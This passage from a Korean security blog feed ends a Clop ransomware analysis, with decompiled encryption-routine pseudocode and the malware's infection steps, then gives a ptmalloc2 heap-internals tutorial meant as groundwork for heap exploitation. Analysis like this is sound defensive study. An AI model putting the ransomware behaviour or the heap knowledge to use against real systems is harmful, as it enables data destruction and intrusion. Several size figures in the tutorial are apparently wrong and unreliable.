class="line">      v12 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x87</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">      v13 = v2-&gt;hKey;</span><br><span class="line">      lpBuffer = v12;</span><br><span class="line">      encrypt_key(rc4_key_, (<span class="keyword">int</span>)&amp;nNumberOfBytesToWrite, (<span class="keyword">int</span>)v2, v2-&gt;pki, v2-&gt;hProv, v13, (BYTE *)v12);</span><br><span class="line">      v14 = (<span class="keyword">void</span> *)lpBuffer;</span><br><span class="line">      <span class="keyword">if</span> ( WriteFile(v11, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v14 )</span><br><span class="line">          VirtualFree(v14, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">      CloseHandle(v11);</span><br><span class="line">    v7 = (<span class="keyword">void</span> *)v29;</span><br><span class="line">  &#125;</span><br><span class="line">  rc4_init((<span class="keyword">int</span>)rc4_key_, <span class="number">117</span>, (<span class="keyword">int</span>)&amp;a3);</span><br><span class="line">  v15 = nNumberOfBytesToRead;</span><br><span class="line">  rc4_encrypt((<span class="keyword">char</span> *)v7, nNumberOfBytesToRead, (<span class="keyword">char</span> *)&amp;a3);</span><br><span class="line">  v16 = hFile;</span><br><span class="line">  SetFilePointer(hFile, <span class="number">0x4000</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  WriteFile(v16, v29, v15, &amp;v28, <span class="number">0</span>);</span><br><span class="line">  v7 = (<span class="keyword">void</span> *)v29;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F232dfd6a-97dd-45df-b9ef-a609fb657267%2FUntitled.png?table=block&id=4d8ce2e0-0edd-4ccb-988e-4bee344d600f&spaceId=44ba02b7-7ecf-4128-9edf-5ee9c344b1ed&width=2130&userId=e7831838-17fc-4bd5-a7cd-ecea2f88bb55&cache=v2" alt="img"></p>
<p>encrypt하는 방식은 크기와 무관하지만, 범위는 다르다. 암호화 되는 범위는 위와 같다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119608828-922c8c00-be31-11eb-9473-0c60a4024516.png" alt="그림26"></p>
<p>파일을 암호화 한 뒤 해당 경로에 <code>README_README.txt</code>의 랜섬노트를 만드는 것을 확인할 수 있다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119608699-585b8580-be31-11eb-8162-11e65de4f6d5.png" alt="그림25"></p>
<p>위와 같은 방법으로 암호화를 진행하며 <code>encrypt_thread</code> 함수는 여러 함수에서 호출된다. 이는 다양한 path에 대한 파일을 찾는 부분은 여러개지만 암호화에 사용되는 함수는 똑같음을 의미한다.</p>
<h1 id="Malicious-behavior"><a href="#Malicious-behavior" class="headerlink" title="Malicious behavior"></a>Malicious behavior</h1><h2 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h2><ol>
<li>악성코드 유포</li>
<li>악성코드 자가 삭제 batch 파일 생성, 루프 돌면서 끝날 때까지 체크</li>
<li>WinCheckDRVs 서비스로 악성코드 등록</li>
<li>모든 드라이브를 돌면서 암호화 대상 파일을 체크 및 암호화</li>
<li>암호화된 파일 경로에 암호화에 쓰인 rc4_key값을 rsa로 암호화 한 내용을 저장(.clip)</li>
<li>암호화된 파일 경로에 랜섬노트 생성</li>
</ol>
<h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><p><img src="https://t1.daumcdn.net/cfile/tistory/99129C365FFC135619?original" alt="img"></p>
<h1 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h1><p><img src="https://user-images.githubusercontent.com/49066484/119609368-6c53b700-be32-11eb-8e1b-d9f599f36a51.png" alt="KakaoTalk_20210522_195528233"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://www.youtube.com/watch?v=XlPqUO_A4VM&amp;ab_channel=%ED%8B%B0%EC%98%A4%EB%A6%AC%ED%8B%B0%EB%B9%84TheoriTV">https://www.youtube.com/watch?v=XlPqUO_A4VM&amp;ab_channel=티오리티비TheoriTV</a></li>
<li><a href="https://wogh8732.tistory.com/363?category=828183">https://wogh8732.tistory.com/363?category=828183</a></li>
<li><a href="https://www.notion.so/S2W-LAB-Analysis-of-Clop-Ransomware-suspiciously-related-to-the-Recent-Incident-c26daec604da4db6b3c93e26e6c7aa26">https://www.notion.so/S2W-LAB-Analysis-of-Clop-Ransomware-suspiciously-related-to-the-Recent-Incident-c26daec604da4db6b3c93e26e6c7aa26</a></li>
</ul>
]]></content>
      <categories>
        <category>Research</category>
      </categories>
      <tags>
        <tag>Malware</tag>
        <tag>Windows</tag>
        <tag>Clop</tag>
        <tag>Ransomware</tag>
      </tags>
  </entry>
  <entry>
    <title>Malloc - glibc(ptmalloc2)</title>
    <url>/2020/06/29/2020-06-30-malloc/</url>
    <content><![CDATA[<h2 id="다양한-memory-allocator"><a href="#다양한-memory-allocator" class="headerlink" title="다양한 memory allocator"></a>다양한 memory allocator</h2><p>heap exploit을 구현하기 위해서는 메모리 관리를 위해 사용되는 Allocator에 대한 이해가 필요하다.</p>
<ul>
<li>dllmalloc - 일반적인 목적의 할당자</li>
<li>ptmalloc2 - glibc</li>
<li>jemalloc - FreeBSD와 Firefox</li>
<li>tcmalloc - Google(Chrome)</li>
<li>libumem - Solaris</li>
</ul>
<h3 id="ptmalloc2"><a href="#ptmalloc2" class="headerlink" title="ptmalloc2"></a>ptmalloc2</h3><ul>
<li>ptmalloc2는 리눅스 GLIBC에서 사용하는 메모리 할당자이다.</li>
<li>운영체제마다 메모리 할당자가 동작하는 방식은 각각 다르며, ptmalloc2는 리눅스 유저 모드에서 주로 사용하는 할당자이다.</li>
<li>ptmalloc2는 glibc 2.23 버전과 glibc 2.26 ( Tcache )이후 버전 동작 방식이 조금 달라졌다.</li>
<li>ptmalloc2는 dlmalloc 코드를 기반으로 하며 멀티 스레드에서 사용되도록 확장되었다. </li>
<li>ptmalloc2는 사용하면 한 번에 두 개 이상의 메모리 영역을 활성화하여 멀티 스레드 어플리케이션을 효율적으로 처리 할 수 있다.</li>
<li>복수의 스레드가 동시에 malloc을 호출하면 각 스레드는 별도의 힙 세그먼트가 생성되고, 해당 힙을 유지 보수하는 데이터 구조도 분리되어 메모리에 할당된다.</li>
<li>따라서 서로 다른 스레드가 서로 간섭하지 않고 서로 다른 메모리 영역에 접근 할 수 있다.</li>
<li>이렇게 각각의 스레드의 유지를 위해 분배된 힙과 freelist data structures의 행동을 per thread arena라고 부른다.</li>
</ul>
<span id="more"></span>

<h2 id="Chunk"><a href="#Chunk" class="headerlink" title="Chunk"></a>Chunk</h2><p>Malloc에 메모리 할당을 요청하면 넓은 메모리의 영역(“Heap”)을 다양한 크기의 덩어리(“Chunk”)로 나눈다.</p>
<ul>
<li>Chunk에는 Allocate Chunk, Free Chunk, Top Chunk, Last Remainder Chunk가 있다.<ul>
<li>Allocate Chunk : malloc이나 calloc 함수 등 동적 메모리 할당 함수를 통해 할당된 청크를 말한다.</li>
<li>Free Chunk : free 함수 등 동적 메모리 해제 함수를 통해 해제된 청크를 말한다.</li>
<li>Top Chunk : 힙 메모리의 마지막에 위치해있는 청크를 말한다. Top Chunk의 마지막은 힙 메모리 영역의 끝이다. 메모리 할당 요청이 들어왔을 때, 사용할 적절한 Free Chunk가 없으면 Top Chunk를 쪼개어 사용한다.</li>
<li>Last Remainder Chunk : 작은 사이즈의 할당 요청이 들어왔을 때, Free Chunk가 쪼개지고 남은 청크를 말한다. Last Remainder Chunk는 연속된 작은 사이즈의 할당 요청이 들어왔을 때 비슷한 주소에 힙 청크가 할당되는 할당의 지역성을 유지시키기 위해 사용된다.<ul>
<li>Allocator는 메모리를 할당할 때 Free chunks 중에서 사용가능한 chunk가 있는지 확인한다. 만약 요청한 크기와 일치하는 Chunk가 없고, 요청된 크기 보다 큰 Chunk가 있다면 해당 Chunk를 분할한다. 이때 분할되고 남은 Chunk가 “Last Remainder Chunk”이다.</li>
</ul>
</li>
</ul>
</li>
<li>각 청크에는 크기와 인접한 청크의 위치에 대한 메타 데이터를 가지고 있다.<ul>
<li>메타 데이터를 이용하여 해당 chunk가 사용중인지 또는 해제되었는지를 알 수 있다.</li>
<li>그리고 이전 청크가 사용중인지 해제되었는지도 알 수 있다.</li>
</ul>
</li>
</ul>
<h2 id="struct-of-malloc-chunk"><a href="#struct-of-malloc-chunk" class="headerlink" title="struct of malloc_chunk"></a>struct of malloc_chunk</h2><p><img src="https://user-images.githubusercontent.com/49066484/138287500-84240be1-e56e-48f8-a92e-f74742a2fc84.png" alt="image"></p>
<p><img src="https://blog.kakaocdn.net/dn/bYFw0F/btqFe4iFrTD/iUNNLD6VwTgxhJmSOflqO0/img.png" alt="image2"></p>
<ul>
<li>free 요청이 발생해 메모리 관리자가 메모리 해제를 수행하려면, 원래 할당했던 메모리의 크기를 정확하게 알고 있어야 한다.</li>
<li>메모리 관리자가 그러한 정보를 기억하는 일반적인 방식은 메모리를 할당할 때 할당된 메모리 블록 첫 부분에 그 블록의 크기를 써 두고,  할당 요청 코드에게는 그 크기를 쓴 부분 이후의 메모리 주소를 반환한다. </li>
<li>따라서 메모리를 요청할때 32bit인 경우, 헤더(8byte) + 요청한크기(8배수 align), 64bit인 경우, 헤더(16byte) + 요청한크기(16배수 align)이 할당된다. </li>
<li>이때 헤더는 prev_size, size로 되어있으며 prev_size는 메모리가 할당 되었을때 데이터 영역으로 사용되므로, align된 요청한 크기 + prev_size 크기 만큼 데이터를 저장할 수 있다.</li>
<li>ex) malloc(32)를 한 경우 (32=0x20) 32는 16배수 이므로 헤더(16byte) + 요청한크기(32byte) = 48byte(0x30)이 할당된다. 여기서 헤더의 16byte중 prev_size의 8byte가 추가로 데이터 영역에 포함되므로 데이터 영역은 40byte가 된다. 즉, malloc(40)까지는 요청했을 경우 48byte(0x30)가 할당된다. 만약 malloc(41)을 했을 경우 48byte(0x30)을 초과하여 다시 16배수로 align을 해줘야 한다. 그러므로 헤더(16byte) + 요청한크기(41byte -&gt; 48byte(가장 가까운 16배수) = 64byte(0x40)이 할당된다. </li>
<li>malloc(32) ~ malloc(40) = 48byte(0x30)[chunk_size]이 할당된다.</li>
<li>malloc(41) ~ malloc(48) ~ malloc(56) = 64byte(0x40)[chunk_size]이 할당된다.</li>
<li>malloc(57) ~ malloc(64) ~ malloc(72) = 80byte(0x80)[chunk_size]이 할당된다.</li>
</ul>
<p>malloc()은 각 Chunk를 관리하기 위해 malloc_chunk 구조체인 mchunkptr를 선언한다.</p>
<ul>
<li>malloc_chunk 구조체는 앞에서 설명한 메타데이터 이다.</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/dyrD5x/btqFe4ivGWx/75uhTqoGOtWIaNV2hSMt50/img.png" alt="1"><br><img src="https://blog.kakaocdn.net/dn/Xstwr/btqFfZnpq2n/uynxJD2aSnSUXVd7ybr6Kk/img.png" alt="2"></p>
<p>구조체 malloc_chunk은 6개의 정보를 관리한다.</p>
<ul>
<li>prev_size : 이전 힙 청크가 해제되었을 경우 해제된 힙 청크의 크기를 저장한다. 해제되기 전까지는 이전 힙 청크의 데이터 영역으로 사용된다.</li>
<li>size : 할당된 현재 힙 청크의 크기를 저장하고있으며, 3개의 비트 플래그가 존재한다.<ul>
<li>Flags (3bit)<ul>
<li>PREV_INUSE <a href="0x1">P</a> : 해당 비트는 이전 힙 청크가 해제된 경우 설정 된다. 1은 이전 청크가 해제되지 않았을 경우이고, 0은 이전 청크가 해제되었을 때 나타내는 값이다.</li>
<li>IS_MMAPPED <a href="0x2">M</a> : 해당 비트는 현재 청크가 mmap 시스템 콜을 사용하여 할당된 경우 설정된다.</li>
<li>NON_MAIN_ARENA <a href="0x4">N</a> : 해당 비트는 현재 청크가 main_arena에서 관리하지 않을 경우에 설정된다.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Free chunk는 크기와 히스토리에 따라 다양한 목록에 저장되며, 이러한 목록들을 “bins”라고 한다.</p>
<ul>
<li>fd(Forward pointer) : fd 포인터가 위치한 주소가 실제로 데이터 영역의 시작 부분이며, 할당되었을 때에는 사용하지 않는다. 힙 청크가 해제되었을 때 동일한 bin에 존재하는 다음 Free 청크의 포인터를 가진다.</li>
<li>bk(Backward pointer) : 동일한 bin에 존재하는 이전 Free 청크의 포인터를 가진다.</li>
<li>fd_nextsize : large bin에서 사용하는 포인터로, 현재 힙 청크의 크기보다 작은 힙 청크의 주소를 가진다.</li>
<li>bk_nextsize : large bin에서 사용하는 포인터로, 현재 힙 청크의 크기보다 큰 힙 청크의 주소를 가진다.</li>
</ul>
<p>모든 청크의 크기는 MALLOC_ALIGNMENT(2 * sizeof(size_t))의 배수이다.</p>
<ul>
<li>32bit의 경우 size_t의 크기가 4byte이기 때문에 chunk의 크기는 8의 배수가 된다.</li>
<li>64bit의 경우 size_t의 크기는 8byte이기 때문에 chunk의 크기는 16의 배수가 된다.</li>
<li>따라서 청크의 mchunk_size에서 3 LSB(least significant bit)를 플래그로 사용될 수 있다.</li>
</ul>
<h3 id="Allocate-Chunk"><a href="#Allocate-Chunk" class="headerlink" title="Allocate Chunk"></a>Allocate Chunk</h3><p><img src="https://blog.kakaocdn.net/dn/bfifzP/btqFgHfyW95/EiK79gkdxCLCQnVMHdXAxK/img.png" alt="3"></p>
<p>Allocate Chunk는 할당자로 부터 메모리를 할당을 받아서 사용중인 메모리 덩어리 이다.</p>
<ul>
<li>이전의 Chunk가 사용가능 할 때, 이전의 Chunk의 크기가 mchunk_prev_size에 저장된다.</li>
<li>해당 chunk의 크기가 mchunk_size에 저장되고, 필드의 맨 끝 3bit는 flag 정보를 나타낸다.</li>
<li>malloc_chunk의 다른 필드(fd,bk)는 할당되어 있는 청크에서는 사용하지 않는다. 따라서 할당되어 있는 청크는 사용자 데이터가 저장되어 있다.</li>
<li>사용자가 요청한 크기는 malloc_chunk를 저장하고 메모리를 정렬하기 위해서는 약간의 공간이 여분으로 필요하기 때문에 사용할 수 있는 크기(청크 내부를 나타내는 크기)로 변환된다.</li>
</ul>
<p><strong>example</strong></p>
<p><img src="https://blog.kakaocdn.net/dn/bRSxbT/btqFed8ks6b/31I2GLWNBUUxuOFvAV9NP0/img.png" alt="4"><br><img src="https://blog.kakaocdn.net/dn/DJAMP/btqFfYWrRSF/3bUFQuQoTwKxhrfrQdFZj0/img.png" alt="5"></p>
<p>malloc()이 호출되기 전이다.</p>
<ul>
<li>시스템은 Heap 공간이 필요한 경우에만 프로세스에 해당 공간을 맵핑한다. </li>
<li>기본적으로 맵핑되어 있지 않다.</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/cGkQBn/btqFfuutQuh/f9FjFkWziqLKnaQGPtwhMk/img.png" alt="6"></p>
<p>malloc()이 호출된 후에 이 프로세스에 Heap 공간이 매핑되었다.</p>
<p><img src="https://blog.kakaocdn.net/dn/dfmYfB/btqFePeQZnf/LjYRo6twBPp92FvnK4KKE1/img.png" alt="7"></p>
<p>할당자로 부터 할당받은 첫번째 Heap의 포인터는 0x602010이다.</p>
<ul>
<li>145(0x91)가 size(0x602008)에 저장되어 있다.<ul>
<li>할당자에 의해 할당되는 청크의 크기는 MALLOC_ALIGNMENT의 배수가 된다.</li>
<li>이 시스템은 64bit이며, size_t의 크기가 8byte이기 때문에 할당되는 청크의 크기는 모두 16의 배수가 되어야한다.</li>
<li>136(0x88)은 16의 배수가 아니며, 해당 수와 가장 가까운 16의 배수는 144이다.</li>
<li>할당자는 이 크기로 청크를 할당한다.</li>
</ul>
</li>
<li>그리고 해당 값에 PREV_INUSE <a href="0x1">P</a> 플래그를 더한 값이 145(0x91)이다.<ul>
<li>해당 chunk가 프로세스에 매핑된 heap 공간의 최상위에 존재하기 때문에 해당 chunk 앞에 새로운 chunk를 할당할 수 없다.</li>
<li>그래서 해당 청크에 PREV_INUSE <a href="0x1">P</a> 플래그가 설정된다.</li>
</ul>
</li>
<li>할당이 가능한 메모리의 크기가 (0x602098)에 저장된다. (Top Chunk 크기)</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/HKcX4/btqFe4CSUjC/lIzpoQBbRXMivgLqU9FdM0/img.png" alt="8"></p>
<p>할당자로부터 할당받은 두번째 Heap의 포인터는 0x6020a0이다.</p>
<ul>
<li>해당 청크의 크기는 97(0x61)이다. </li>
<li>애플리케이션이 요청한 크기는 80(0x50)이다. (16배수)</li>
<li>하지만 할당자는 청크를 관리하기 위해 필요한 헤더(prev_size,size)를 저장하기 위해 요청된 크기에 16을 더해서 메모리를 할당한다.</li>
<li>그리고 해당 청크 앞에 사용중인 청크가 있기 때문에 그 값에 PREV_INUSE <a href="0x1">P</a> 플래그가 더해진다.</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/c7jyH0/btqFfunLOTe/96GFUbxbcBdbt3XzQxhGs0/img.png" alt="9"></p>
<p>프로세스는 free()함수를 이용하여 첫번째 청크(0x602010)를 해제한다.</p>
<ul>
<li>이로 인해 0x602010 ~ 0x602018 메모리에 fd, bk 값이 저장된다.</li>
<li>그리고 두번째 chunk의 prev_size에 해제된 chunk의 크기(0x90)가 저장되고, size에는 PREV_INUSE <a href="0x1">P</a> 플래그 값이 빠진 값이 저장된다.</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/dZ0SWs/btqFdLKXosg/hy8Ik6Nb19gnuIeWW55fp1/img.png" alt="10"></p>
<p>할당자로부터 할당받은 세번째 Heap의 포인터는 0x602010이다.</p>
<ul>
<li>이 포인터는 처음 할당 된 포인터와 동일하다.</li>
<li>malloc()은 메모리 효율성을 위해 free chunk를 관리한다.<ul>
<li>할당자는 메모리의 할당을 요청받으면 free chunk를 먼저 사용한다.</li>
</ul>
</li>
<li>다시 할당받은 chunk는 이전에 저장된 데이터가 초기화 되지 않고 그대로 존재한다.</li>
<li>변경되는 값은 두번째 chunk의 size값이며, 0x60에서 0x61로 변경된다.<ul>
<li>두번째 chunk의 앞에 chunk가 할당되어 사용중이기 때문에 PREV_INUSE <a href="0x1">P</a> 플래그 값이 추가되었다.</li>
</ul>
</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/bMbUx7/btqFec2DDCv/SrOhtmPmupkW9mEejnI2kk/img.png" alt="11"></p>
<p>새로 할당받은 heap 메모리는 정상적으로 사용가능하다.</p>
<ul>
<li>값을 입력하게 되면 이전에 저장되어 있던 값을 덮어쓰게 된다.</li>
</ul>
<h3 id="Free-Chunk"><a href="#Free-Chunk" class="headerlink" title="Free Chunk"></a>Free Chunk</h3><p><img src="https://blog.kakaocdn.net/dn/XfnRd/btqFec9ofBF/zl2LCpjRzmQEhudRNFWXk0/img.png" alt="12"></p>
<p>Free chunk는 할당자에게 반환된 chunk 이다.</p>
<ul>
<li>Chunk의 크기에 따라 fd, bk, fd_nextsize, bk_nextsize의 값이 해당 chunk내에 저장된다.<ul>
<li>Chunk의 크기가 최소의 크기 일 경우 fd_nextsize, bk_nextsize의 값을 저장할 수 없다.</li>
<li>이 경우 Free chunk의 크기가 커지지 않는다.<ul>
<li>해당 chunk는 prev_size, size, fd, bk 값만을 메모리에 저장한다.</li>
<li>fd_nextsize, bk_nextsize는 오직 large bin에서만 사용된다.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>example</strong></p>
<p><img src="https://blog.kakaocdn.net/dn/eouLHz/btqFgwSXqQ3/FiKp4HkWub83rtiKK23bok/img.png" alt="13"></p>
<p><img src="https://blog.kakaocdn.net/dn/DtUdh/btqFgwZIuOK/T5L3wrFCtIsKRFUyUmiQx1/img.png" alt="14"></p>
<p>할당자가 할당한 메모리는 다음과 같다.</p>
<ul>
<li>chunk의 크기가 128바이트인 메모리가 3개(0x602010, 0x6020c0, 0x602170) 할당되었다. (0x90)</li>
<li>chunk의 크기가 8바이트인 메모리가 3개(0x6020a0, 0x602150, 0x602200) 할당되었다. (0x20)</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/uBdWR/btqFe3xaLQR/QLa8KkKN6LeFwfjYiHUGnk/img.png" alt="15"></p>
<p>heap1(0x602010)이 해제되면 해당 chunk에 bk,fd 값이 저장된다.</p>
<ul>
<li>이전 청크의 크기(0x90)는 tmp2(0x6020a0)의 “prev_size”에 저장되며, “size”에는 PREV_INUSE [P] (0x1) 플래그의 값을 뺀 값(0x20)이 저장된다.</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/dNckmz/btqFgyiWeTR/fWJdF3fq5KRrcFqhTKoB90/img.png" alt="16"></p>
<p>heap2(0x6020c0)가 해제되면 해당 chunk에 fd, bk값이 저장된다.</p>
<ul>
<li>fd(0x6020c0)에 저장되는 값은 해당 chunk 앞에 있는 Free chunk의 mchunkptr(0x602000)이다.</li>
<li>그리고 heap1의 bk(0x602018)에 heap2의 mchunkptr(0x6020b0)이 저장된다.</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/nctV3/btqFedtL1xH/Ox0QwWePghRe6KOPwwbsQ0/img.png" alt="17"></p>
<p>heap3(0x602170)가 해제되면 fd(0x602170)에 해당 chunk 앞에 있는 Free chunk의 mchunkptr(0x6020b0)이 저장된다.</p>
<ul>
<li>그리고 heap2의 bk(0x6020c8)에 heap3의 mchunkptr(0x602160)이 저장된다.</li>
</ul>
<h2 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h2><p>해제된 힙 청크(Free Chunk)는 bin이라는 freelist 구조체를 통해 관리된다.</p>
<ul>
<li><p>freelist란 동적으로 메모리를 할당하고 해제할 때 메모리 관리의 효율을 높이기 위해 할당되지 않은 영역을 관리하는 연결 리스트이다.</p>
</li>
<li><p>영역을 해제할 때 해제하려는 영역을 freelist에 추가하고, 할당 요청이 들어왔을 때 freelist에 추가된 영역을 제거하고 해당 영역을 사용힌다.</p>
</li>
<li><p>bins의 종류에는 Fast bin, Small bin, Large bin, Unsorted bin이 있다.</p>
</li>
<li><p>fastbinsY - 이 배열은 fast bin을 수용한다.</p>
</li>
<li><p>bins - 이 배열은 unsorted, small, large bin을 수용한다. 총 126개의 bin이 있다.</p>
<ul>
<li>Bin 1 - Unsorted bin (1개)</li>
<li>Bin 2 ~ Bin 63 - Small bin (62개)</li>
<li>Bin 64 ~ Bin 126 - Large bin (63개)</li>
</ul>
</li>
</ul>
<h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p><img src="https://blog.kakaocdn.net/dn/AQBjs/btqFhmo94if/6SppT0OKZKXyFkyf8wuWv1/img.png" alt="18"><br><img src="https://blog.kakaocdn.net/dn/DxPpL/btqFhLhVOaS/zoUGSmneXQdF8xxjUXkbSk/img.png" alt="19"></p>
<p>M_MXFAST(1)라는 매개변수를 사용해서 “fastbin”에 포함되는 청크의 범위를 설정한다.</p>
<ul>
<li>“fastbin”에 포함되는 chunk 크기의 범위는 0에서 80*sizeof(size_t)/4까지 이다. </li>
<li>“fastbin”의 기본 범위는 0에서 64*sizeof(size_t)/4 이다. (mallopt() 함수로 확장 가능)</li>
<li>32비트 아키텍처에서 패스트빈의 상한은 64byte(64<em>4/4)이며, 64비트 아키텍처에서는 128byte(64</em>8/4)이다.<ul>
<li>해당 크기보다 작은 chunk들이 fastbin에 배치된다.</li>
</ul>
</li>
<li>해당 크기는 매개변수 “value”를 이용하여 변경할 수 있다.<ul>
<li>매개변수를 최대로 설정하면 32비트 아키텍처에서는 최대 80byte(80<em>4/4), 64bit에서는 최대 160byte(80</em>8/4)의 상한을 설정 할 수 있다.</li>
<li>fast bin을 비활성화하려면 0으로 설정하면 된다.</li>
</ul>
</li>
<li>Fastbin은 LIFO(last in, first out)를 사용한다.<ul>
<li>마지막으로 해제 된 chunk가 먼저 재 할당된다.</li>
</ul>
</li>
<li>해당 bin은 최대 10개의 bin 관리 할 수 있으며, 패스트빈의 상한 값보다 크기가 작은 chunk들을 관리한다.<ul>
<li>64bit 아키텍처의 경우 Fastbin에 포함되는 chunk의 크기는 32, 48, 64, 80, 96, 112, 128 이다.</li>
<li>32bit 아키텍처의 경우 Fastbin에 포함되는 chunk의 크기는 16, 24, 32, 40, 48, 56, 64 이다.</li>
</ul>
</li>
<li>해당 bin은 single-linked list로 구성된다.<ul>
<li>같은 크기의 chunk가 해제되면 마지막으로 해제된 chunk의 fd에 새로 해제된 chunk의 mchunkptr을 저장된다.</li>
<li>bk는 사용하지 않는다.</li>
</ul>
</li>
<li>해당 bin에 포함되는 chunk들은 서로 인접해 있어도 병합하지 않는다.</li>
</ul>
<p><strong>example</strong></p>
<p><img src="https://blog.kakaocdn.net/dn/zOfPF/btqFg3jwPXh/VsfZogqPikwzk114kw4yU1/img.png" alt="20"></p>
<p>마지막 free()를 호출한 다음의 코드에 Breakpoint를 설정하고 프로그램을 실행한다.</p>
<ul>
<li>main_arena의 정보는 gdb에 “p main_arena” 명령어를 입력하면 확인할 수 있다.</li>
<li>해제된 chunk들 중 fastbin에 포함되는 chunk들은 fastbinsY에 배치되어 있다.</li>
<li>배치된 chunk들의 크기는 0x20(32) ~ 0x80(128)이다.</li>
<li>malloc(16) ~ malloc(112) -&gt; 0x20(32) ~ 0x80(128)</li>
</ul>
<p>fastbin에서 동일한 chunk들의 관리</p>
<p><img src="https://blog.kakaocdn.net/dn/cS6x8D/btqFhlYyOf6/sry7c1SQ3CX42WHpOXsrFk/img.png" alt="21"></p>
<p>해제된 chunk들 중 가장 나중에 free된 chunk가 fastbinsY에 배치된다.</p>
<ul>
<li>이 chunk의 fd에는 두번째 free chunk의 mchunkptr이 저장되어 있다.</li>
<li>그리고 두번째 chunk의 fd에는 세번째 chunk의 mchunkptr이 저장되어 있다. (뒤로 갈수록 가장 먼저 free된 chunk)</li>
<li>bk에는 어떠한 값도 배치되지 않는다.</li>
<li>single-linked list 형태로 fastbin들이 연결된다.</li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/boJPOL/btqFgx6wsDn/mzkjbx0coKUHCg8HPwsQGk/img.png" alt="22"></p>
<p>malloc()에 크기가 16byte인 메모리의 할당을 요청하면, Allocater는 해당 크기과 동일한 free chunk가 있는지 fastbinsY에서 확인한다.</p>
<ul>
<li>할당자는 fastbinsY에 동일한 크기의 chunk가 있다면 해당 chunk를 재할당한다.</li>
<li>fastbinsY에는 두번째 free chunk가 배치되었고, 첫번째(가장 최근에 free된) free chunk가 반환되었다.</li>
<li>반환된 chunk에 값이 정상적으로 써진다. </li>
</ul>
<p><img src="https://blog.kakaocdn.net/dn/dpwJYU/btqFiOZ2dg6/hdE10QjVoTAWHTckvm5840/img.png" alt="23"></p>
<h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p><img src="https://blog.kakaocdn.net/dn/cqewZI/btqFiAhMME9/Z8kFVHvkUF28BxSlq3O7U1/img.png" alt="24"></p>
<ul>
<li>Small bin이 포함하는 chunk는 크기가 MIN_LARGE_SIZE 보다 작은 chunk들이다.<ul>
<li>32bit 시스템은 MALLOC_ALIGNMENT는 8이고, SIZE_SZ는 4이다.<ul>
<li>MIN_LARGE_SIZE는 512((64 - 0) * 8)이다.</li>
</ul>
</li>
<li>64bit 시스템은 MALLOC_ALIGNMENT는 16이고,SIZE_SZ는 8이다.<ul>
<li>MIN_LARGE_SIZE는 1024((64 * 0) * 16)이다.</li>
</ul>
</li>
<li>즉, 32bit 시스템에서 Small bin의 범위는 16<del>504byte(64*8-8)이며 64bit에서는 32</del>1008byte이다.</li>
</ul>
</li>
<li>해당 bin은 62개의 bin들을 관리하며, doubly-linked list로 구성된다.<ul>
<li>같은 크기의 chunk가 해제되면 마지막으로 해제된 chunk의 bk에 새로 해제된(나중에 해제된) chunk의 mchunkptr가 저장된다.</li>
<li>새로 해제된 chunk의 fd에 마지막으로 해제된(먼저 해제된) 같은 크기의 chunk의 mchunkptr가 저장된다.</li>
</ul>
</li>
<li>Small bin은 FIFO(First In, First Out)을 사용한다.<ul>
<li>먼저 해제 된 청크가 먼저 재 할당된다.</li>
</ul>
</li>
<li>Small bin에 해당되는 chunk들은 서로 인접하게 배치될수 없다.<ul>
<li>해당 chunk가 서로 인접해 있을 경우 하나의 chunk로 병합된다.</li>
</ul>
</li>
<li>Small bin은 각 16바이트 크기를 가지는 청크 binlist를 가진다.<ul>
<li>ex) 첫 번째 Small bin(Bin 2)은 32바이트 크기의 청크 binlist를 가지며, 두 번째 small bin(Bin 3)은 48바이트 크기의 청크 binlist를 가지는 식으로, 이어진다.</li>
</ul>
</li>
</ul>
<p>bin의 인덱스는 smallbin_index() 함수를 이용하여 확인 할 수 있다.</p>
<ul>
<li>이함수는 SMALLBIN_WIDTH을 사용해서 해당 시스템이 32bit인지 64bit인지 확인한다.<ul>
<li>64bit의 경우 chunk 크기를 16으로, 32bit의 경우 chunk의 크기를 8로 나눈다음, 그 값에 SMALLBIN_CORRECTION를 더 한다.</li>
<li>이 값이 해당 chunk에 대한 bin 인덱스 이다.</li>
</ul>
</li>
<li>예를 들어 64bit에서 144byte의 free chunk의 bin의 인덱스는 9(144 &gt;&gt; 4 + 0)이다. bin 9</li>
<li>free chunk의 인덱스는 ((144 &gt;&gt; 4 + 0) - 1) * 2 = 16(fd),17(bk) 이다.</li>
</ul>
<p><strong>example</strong></p>
<p><img src="https://blog.kakaocdn.net/dn/cgiar4/btqFkmQburO/WBtrk4YETygknSGVBlLANk/img.png" alt="25"></p>
